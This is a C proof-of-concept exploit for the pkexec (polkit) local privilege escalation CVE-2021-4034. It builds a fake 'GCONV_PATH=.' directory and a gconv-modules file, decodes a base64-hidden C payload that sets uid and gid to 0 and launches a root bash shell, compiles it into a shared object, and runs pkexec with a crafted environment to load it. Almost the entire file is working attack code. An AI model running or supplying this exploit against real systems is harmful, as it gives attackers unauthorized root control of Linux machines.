#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int check_version();

int main() {
    int pass;
    
    check_version();

    char* pkexec_path = "/usr/bin/pkexec";
    char* null_args[] = {NULL};
    char* pkexec_env[] = {"tmp", "CHARSET=POPPY", "SHELL=x", "PATH=GCONV_PATH=.", "GIO_USE_VFS=",NULL};
    
    system("mkdir 'GCONV_PATH=.'; touch 'GCONV_PATH=./tmp'; chmod +x 'GCONV_PATH=./tmp'");
    system("mkdir tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCnZvaWQgZ2NvbnYoKSB7fQoKdm9pZCBnY29udl9pbml0KCkgewogIHNldHVpZCgwKTsKICBzZXRnaWQoMCk7CiAgc2V0ZXVpZCgwKTsKICBzZXRlZ2lkKDApOyAgCiAgc3lzdGVtKCIvdXNyL2Jpbi9zdWRvIC11IHJvb3QgLWkgL2Jpbi9iYXNoIik7CiAgZXhpdCgwKTsKfQ== | base64 -d > tmp/payload.c; gcc tmp/payload.c -o tmp/poppy.so -shared -fPIC ");
    system("echo bW9kdWxlIFVURi04Ly8gUE9QUFkvLyBwb3BweSAyCg== | base64 -d > tmp/gconv-modules");

    printf("enter 1337 to finalize the POC : ");
    scanf("%d",&pass);

    if(pass == 1337) {
        execve(pkexec_path, null_args, pkexec_env);
    }
    else {
        exit(0);
    }
}

int check_version() {
    char input[10];
    char* exec_out = system("/usr/bin/pkexec --version");
    
    printf("is polkit version < 0.120 (y or n) : ");
    scanf("%s",input);

    if(strcmp(input,"y")) {
        printf("poppy-cve-2021-4034\n");
        exit(0);
    }
    else if(strcmp(input, "n")) {
        printf("poppy-polkit : POC\n");
    }
}